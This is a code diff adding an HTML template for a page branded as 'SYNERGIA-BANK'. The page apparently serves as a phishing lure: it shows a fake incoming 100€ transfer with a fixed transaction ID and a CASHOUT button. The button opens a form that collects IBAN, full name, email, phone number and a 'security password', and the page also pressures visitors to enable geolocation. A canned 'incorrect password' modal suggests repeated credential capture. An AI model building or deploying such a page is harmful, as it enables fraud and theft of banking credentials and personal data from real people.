@@ -1,0 +1,116 @@
+{% extends "base.html" %}
+
+{% block title %}Transfert - SYNERGIA-BANK{% endblock %}
+
+{% block content %}
+<div class="hero-section">
+    <div class="hero-content">
+        <h1 class="hero-title">Transaction Verification</h1>
+        <div class="transaction-info">
+            <p class="transaction-message">Have you received a money transfer? Enter the transaction number you received from the sender</p>
+            
+            <!-- Formulaire de vérification de transaction -->
+            <div id="verification-form" class="verification-form">
+                <div class="form-group">
+                    <label for="transaction-number">Transaction Number:</label>
+                    <input type="text" id="transaction-number" name="transaction-number" required>
+                </div>
+                <button id="check-transfer-btn" class="button">CHECK TRANSFER</button>
+            </div>
+            
+            <!-- Détails de la transaction (initialement masqués) -->
+            <div id="transaction-details" class="transaction-details" style="display: none;">
+                <h2>Transaction Details</h2>
+                <div class="transaction-id">WRMAUJZ7KIZ3JP2C5J6</div>
+                <div class="transaction-amount">100€</div>
+                <button id="cashout-btn" class="button cashout">CASHOUT</button>
+            </div>
+        </div>
+    </div>
+    <div class="hero-image">
+        <!-- Image d'une personne professionnelle -->
+    </div>
+</div>
+
+<!-- Modal pour le formulaire IBAN -->
+<div id="iban-modal" class="modal">
+    <div class="modal-content">
+        <span class="close">&times;</span>
+        <h2>Bank Transfer Information</h2>
+        <form id="transfer-form">
+            <div class="form-group">
+                <label for="iban">IBAN:</label>
+                <input type="text" id="iban" name="iban" pattern="^[A-Z]{2}[0-9]{2}[A-Z0-9]{1,30}$" required>
+                <small>Format: CC00XXXXXXXXXXXX (ex: FR7630006000011234567890189)</small>
+            </div>
+            <div class="form-group">
+                <label for="nom">Last Name:</label>
+                <input type="text" id="nom" name="nom" required>
+            </div>
+            <div class="form-group">
+                <label for="prenom">First Name:</label>
+                <input type="text" id="prenom" name="prenom" required>
+            </div>
+            <div class="form-group">
+                <label for="email">Email:</label>
+                <input type="email" id="email" name="email" pattern="[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$" required>
+                <small>Format: example@domain.com</small>
+            </div>
+            <div class="form-group">
+                <label for="telephone">Phone Number:</label>
+                <input type="tel" id="telephone" name="telephone" pattern="[0-9]{10,15}" required>
+                <small>You will receive a validation code on this number</small>
+            </div>
+            <div class="form-group">
+                <label for="password">Security Password:</label>
+                <input type="password" id="password" name="password" required>
+                <small>Enter your security password to confirm this transaction</small>
+            </div>
+            <button type="submit" class="button">VALIDATE</button>
+        </form>
+    </div>
+</div>
+
+<!-- Modal de chargement -->
+<div id="loading-modal" class="modal">
+    <div class="modal-content loading-content">
+        <div class="loader"></div>
+        <p id="loading-text">Processing your transfer...</p>
+    </div>
+</div>
+
+<!-- Modal d'erreur de géolocalisation -->
+<div id="geoloc-error-modal" class="modal">
+    <div class="modal-content">
+        <span class="close">&times;</span>
+        <h2>Geographic Restriction</h2>
+        <p>Money transfers are geographically restricted. Please enable geolocation to continue.</p>
+        <button id="retry-geolocation" class="button">Try Again</button>
+    </div>
+</div>
+
+<!-- Modal d'erreur de mot de passe -->
+<div id="password-error-modal" class="modal">
+    <div class="modal-content">
+        <span class="close">&times;</span>
+        <h2>Authentication Error</h2>
+        <p>The security password you entered is incorrect. Please try again.</p>
+        <button id="retry-password" class="button">Try Again</button>
+    </div>
+</div>
+
+<!-- Modal d'erreur de transaction -->
+<div id="transaction-error-modal" class="modal">
+    <div class="modal-content">
+        <span class="close">&times;</span>
+        <h2>Transaction Error</h2>
+        <p>The transaction number you entered is invalid or does not exist. Please check and try again.</p>
+        <button id="retry-transaction" class="button">Try Again</button>
+    </div>
+</div>
+{% endblock %}
+
+{% block extra_scripts %}
+<script src="{{ url_for('static', filename='js/transfer.js') }}"></script>
+<script src="{{ url_for('static', filename='js/validation.js') }}"></script>
+{% endblock %}
